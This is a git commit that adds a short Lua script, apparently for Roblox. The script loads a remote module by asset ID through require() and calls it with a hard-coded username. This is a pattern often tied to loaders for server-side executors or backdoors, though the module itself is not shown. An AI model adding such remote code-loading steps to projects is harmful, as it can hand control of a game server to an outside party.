10c049a5ec23f0511391fa7c8f3956fd7862d8e5
pooiod7 <portsmouthuser35@gmail.com>
2025-05-03 22:31:30 -0400

    Create the_crucible.lua

---
+++ the_crucible.lua
@@ -0,0 +1,15 @@
+local id = 11426647177
+local user = 'pooiod7'
+local d = require(id)
+if type(d) == 'function' then
+	d(user)
+	return 0
+end
+if type(d) == 'table' then
+	for _, f in d do
+		if type(f) == 'function' then
+			f(user)
+			return 0
+		end
+	end
+end
